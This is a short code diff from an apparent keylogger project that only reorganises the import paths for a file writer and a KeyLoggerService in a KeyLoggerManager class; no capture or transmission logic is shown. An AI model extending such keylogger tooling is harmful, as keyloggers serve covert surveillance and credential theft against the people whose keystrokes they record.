@@ -1,7 +1,6 @@
 import threading
-from File_writer import FileWriter
-from Key_logger_service import KeyLoggerService
-
+from implementation.writers.file_writer import FileWriter
+from implementation.loggers.k import KeyLoggerService
 
 class KeyLoggerManager:
     def __init__(self):
